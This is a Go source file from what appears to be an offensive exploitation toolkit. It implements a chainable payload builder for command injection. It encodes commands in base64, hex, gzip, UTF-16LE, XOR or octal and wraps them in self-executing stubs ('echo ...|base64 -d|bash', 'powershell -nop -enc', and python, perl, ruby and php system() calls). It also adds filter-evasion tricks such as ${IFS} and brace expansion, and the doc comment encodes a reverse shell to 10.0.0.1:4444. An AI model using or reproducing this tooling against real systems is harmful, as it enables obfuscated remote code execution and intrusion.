package payload

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/Chocapikk/pik/pkg/encode"
)

// Cmd is a chainable payload builder. Create one with NewCmd, apply transforms,
// and call String() to get the final result.
//
//	payload.NewCmd(payload.Bash("10.0.0.1", 4444)).
//	    Encode(Base64Enc).
//	    Deliver(BashDec).
//	    Trail().
//	    String()
//
//	// -> echo YmFzaC...MQ==|base64 -d|bash #
type Cmd struct {
	data string
}

// NewCmd creates a new payload from a raw command string.
func NewCmd(raw string) *Cmd {
	return &Cmd{data: raw}
}

// --- Encoders ---

type Encoder int

const (
	Base64Enc     Encoder = iota // standard base64
	Base64URLEnc                 // URL-safe base64
	HexEnc                       // hex encoding
	URLEnc                       // percent encoding
	DoubleURLEnc                 // double percent encoding
	GzipBase64Enc                // gzip then base64
	UTF16LEEnc                   // UTF-16LE (for PowerShell -enc)
	OctalEnc                     // bash $'\NNN' octal escapes
	ROT13Enc                     // ROT13 substitution
)

// Encode applies an encoding to the payload data.
func (c *Cmd) Encode(enc Encoder) *Cmd {
	switch enc {
	case Base64Enc:
		c.data = base64.StdEncoding.EncodeToString([]byte(c.data))
	case Base64URLEnc:
		c.data = base64.URLEncoding.EncodeToString([]byte(c.data))
	case HexEnc:
		c.data = hex.EncodeToString([]byte(c.data))
	case URLEnc:
		c.data = encode.URLRaw(c.data)
	case DoubleURLEnc:
		c.data = encode.URLRaw(encode.URLRaw(c.data))
	case GzipBase64Enc:
		var buf bytes.Buffer
		w := gzip.NewWriter(&buf)
		_, _ = w.Write([]byte(c.data))
		_ = w.Close()
		c.data = base64.StdEncoding.EncodeToString(buf.Bytes())
	case UTF16LEEnc:
		c.data = base64.StdEncoding.EncodeToString(encode.UTF16LE(c.data))
	case OctalEnc:
		c.data = toOctalBash(c.data)
	case ROT13Enc:
		c.data = encode.ROT13(c.data)
	}
	return c
}

// XOR applies XOR encoding with a repeating key, then hex-encodes the result.
func (c *Cmd) XOR(key []byte) *Cmd {
	c.data = hex.EncodeToString(encode.XOR([]byte(c.data), key))
	return c
}

// --- Decoders / Delivery wrappers ---

type Decoder int

const (
	BashDec       Decoder = iota // echo <b64>|base64 -d|bash
	BashSubstDec                 // bash -c "$(echo <b64>|base64 -d)"
	HexBashDec                   // echo <hex>|xxd -r -p|bash
	GzipBashDec                  // echo <gz+b64>|base64 -d|gunzip|bash
	PythonDec                    // python3 -c "import base64,os;..."
	PerlDec                      // perl -MMIME::Base64 -e '...'
	PowerShellDec                // powershell -nop -enc <data>
	RubyDec                      // ruby -e "require 'base64';system(Base64.decode64('...'))"
	PHPDec                       // php -r "system(base64_decode('...'));"
)

// Deliver wraps the encoded payload with a decoder/executor.
func (c *Cmd) Deliver(dec Decoder) *Cmd {
	switch dec {
	case BashDec:
		c.data = fmt.Sprintf("echo %s|base64 -d|bash", c.data)
	case BashSubstDec:
		c.data = fmt.Sprintf(`bash -c "$(echo %s|base64 -d)"`, c.data)
	case HexBashDec:
		c.data = fmt.Sprintf("echo %s|xxd -r -p|bash", c.data)
	case GzipBashDec:
		c.data = fmt.Sprintf("echo %s|base64 -d|gunzip|bash", c.data)
	case PythonDec:
		c.data = fmt.Sprintf(
			`python3 -c "import base64,os;os.system(base64.b64decode(b'%s').decode())"`, c.data)
	case PerlDec:
		c.data = fmt.Sprintf(
			`perl -MMIME::Base64 -e 'system(decode_base64("%s"))'`, c.data)
	case PowerShellDec:
		c.data = fmt.Sprintf("powershell -nop -enc %s", c.data)
	case RubyDec:
		c.data = fmt.Sprintf(
			`ruby -e "require 'base64';system(Base64.decode64('%s'))"`, c.data)
	case PHPDec:
		c.data = fmt.Sprintf(
			`php -r "system(base64_decode('%s'));"`, c.data)
	}
	return c
}

// --- Modifiers ---

// Trail appends " #" to neutralize trailing arguments in injected contexts.
func (c *Cmd) Trail() *Cmd {
	c.data += " #"
	return c
}

// Bg appends " &" to run in background.
func (c *Cmd) Bg() *Cmd {
	c.data += " &"
	return c
}

// Nohup wraps the command with nohup and redirects output.
func (c *Cmd) Nohup() *Cmd {
	c.data = fmt.Sprintf("nohup %s >/dev/null 2>&1 &", c.data)
	return c
}

// Quiet redirects stdout and stderr to /dev/null.
func (c *Cmd) Quiet() *Cmd {
	c.data += " >/dev/null 2>&1"
	return c
}

// Prepend adds a prefix string.
func (c *Cmd) Prepend(s string) *Cmd {
	c.data = s + c.data
	return c
}

// Append adds a suffix string.
func (c *Cmd) Append(s string) *Cmd {
	c.data += s
	return c
}

// Semi chains another command with a semicolon separator.
func (c *Cmd) Semi(cmd string) *Cmd {
	c.data += "; " + cmd
	return c
}

// Pipe chains another command with a pipe.
func (c *Cmd) Pipe(cmd string) *Cmd {
	c.data += " | " + cmd
	return c
}

// And chains another command with &&.
func (c *Cmd) And(cmd string) *Cmd {
	c.data += " && " + cmd
	return c
}

// --- Bash obfuscation ---

// IFS replaces spaces with ${IFS} for bash injection contexts where spaces are filtered.
func (c *Cmd) IFS() *Cmd {
	c.data = strings.ReplaceAll(c.data, " ", "${IFS}")
	return c
}

// Tabs replaces spaces with tab characters.
func (c *Cmd) Tabs() *Cmd {
	c.data = strings.ReplaceAll(c.data, " ", "\t")
	return c
}

// BraceExpand rewrites "cmd arg" as "{cmd,arg}" for bash brace expansion.
func (c *Cmd) BraceExpand() *Cmd {
	parts := strings.Fields(c.data)
	if len(parts) > 1 {
		c.data = "{" + strings.Join(parts, ",") + "}"
	}
	return c
}

// DollarQuote converts the entire command to bash $'...' with hex escapes.
func (c *Cmd) DollarQuote() *Cmd {
	var b strings.Builder
	b.WriteString("$'")
	for _, ch := range []byte(c.data) {
		fmt.Fprintf(&b, "\\x%02x", ch)
	}
	b.WriteByte('\'')
	c.data = fmt.Sprintf("bash -c %s", b.String())
	return c
}

// VarSplit obfuscates by splitting the command into shell variable assignments.
func (c *Cmd) VarSplit() *Cmd {
	raw := c.data
	if len(raw) > 50 {
		return c.Encode(Base64Enc).Deliver(BashDec)
	}
	chars := []byte(raw)
	parts := make([]string, 0, len(chars))
	refs := make([]string, 0, len(chars))
	for i, ch := range chars {
		v := fmt.Sprintf("_%c", 'a'+byte(i%26))
		parts = append(parts, fmt.Sprintf(`%s="%c"`, v, ch))
		refs = append(refs, "$"+v)
	}
	c.data = strings.Join(parts, ";") + ";" + strings.Join(refs, "")
	return c
}

// --- Output ---

// String returns the final payload string.
func (c *Cmd) String() string { return c.data }

// Bytes returns the final payload as bytes.
func (c *Cmd) Bytes() []byte { return []byte(c.data) }

// Len returns the length of the current payload.
func (c *Cmd) Len() int { return len(c.data) }

// --- Standalone convenience functions ---

// Wrap is a generic encode+deliver shortcut.
func Wrap(cmd string, enc Encoder, dec Decoder) string {
	return NewCmd(cmd).Encode(enc).Deliver(dec).String()
}

// Base64Bash wraps a command with base64 encoding + bash execution.
func Base64Bash(cmd string) string { return Wrap(cmd, Base64Enc, BashDec) }

// Base64BashC wraps a command using bash -c with base64 decoding.
func Base64BashC(cmd string) string { return Wrap(cmd, Base64Enc, BashSubstDec) }

// Base64Python wraps a command with base64 encoding + python execution.
func Base64Python(cmd string) string { return Wrap(cmd, Base64Enc, PythonDec) }

// Base64Perl wraps a command with base64 encoding + perl execution.
func Base64Perl(cmd string) string { return Wrap(cmd, Base64Enc, PerlDec) }

// Base64PowerShell wraps a command with UTF-16LE base64 for powershell -enc.
func Base64PowerShell(cmd string) string { return Wrap(cmd, UTF16LEEnc, PowerShellDec) }

// HexBash wraps a command with hex encoding + xxd bash execution.
func HexBash(cmd string) string { return Wrap(cmd, HexEnc, HexBashDec) }

// CommentTrail appends " #" to neutralize trailing arguments.
func CommentTrail(cmd string) string { return NewCmd(cmd).Trail().String() }

// BackgroundExec appends " &" to run in background.
func BackgroundExec(cmd string) string { return NewCmd(cmd).Bg().String() }

// NohupExec wraps with nohup and output redirection.
func NohupExec(cmd string) string { return NewCmd(cmd).Nohup().String() }

// SemicolonChain joins commands with semicolons.
func SemicolonChain(cmds ...string) string { return strings.Join(cmds, "; ") }

// PipeChain joins commands with pipes.
func PipeChain(cmds ...string) string { return strings.Join(cmds, " | ") }

// URLEncodeStr applies URL encoding to a string.
func URLEncodeStr(cmd string) string { return encode.URLRaw(cmd) }

// DoubleURLEncodeStr applies double URL encoding to a string.
func DoubleURLEncodeStr(cmd string) string { return encode.URLRaw(encode.URLRaw(cmd)) }

// --- Internal helpers (unique to payload, not in encode pkg) ---

func toOctalBash(s string) string {
	var b strings.Builder
	b.WriteString("$'")
	for _, ch := range []byte(s) {
		fmt.Fprintf(&b, "\\%03o", ch)
	}
	b.WriteByte('\'')
	return b.String()
}
